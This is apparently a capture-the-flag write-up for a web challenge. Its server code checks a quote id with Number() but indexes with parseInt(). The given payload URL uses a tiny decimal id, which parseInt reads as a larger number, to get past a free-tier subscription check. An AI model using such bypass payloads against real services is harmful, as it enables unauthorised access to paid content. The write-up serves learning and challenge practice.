
---

# Solution
First we need to go to register endpoint to get cookie.
```javascript
app.get("/register", (req, res) => {
  const token = jwt.sign(
    {
      subscribed: false,
    },
    SECRET_KEY,
    { expiresIn: "1h" }
  );

  res.cookie(COOKIE_NAME, token, {
    httpOnly: true,
    secure: true,
    maxAge: 3600000,
  });
  res.status(200);
  res.send({ message: "Signed in!" });
});
```

The server take the id in the request parameter then response with a quote according to the id. There is a condition that if the id exceed the free limit(5), we wont get anything. But the id is parse to Number method and parseInt method.
```javascript
  if (id) {
    const i = Number(id);

    if (!decoded.subscribed && i >= FREE_TIER_QUOTE_LIMIT) {
      res.status(500);
      res.send({ error: "Not a paying subscriber" });
      return;
    }

    if (i < 0 || i >= quotes.length) {
      res.status(500);
      res.send({ error: "Invalid quote ID" });
      return;
    }

    const quote = quotes[parseInt(i)];

    res.status(200);
    res.send({ quote, id: i });
    return;
  }
```
# Payload
```
http://yourlink/quote?id=0.00000007
```
We can bypass the filter by exploiting the parseInt function.
[Explanation](https://stackoverflow.com/questions/69613606/why-does-javascripts-parseint0-0000005-print-5)

---

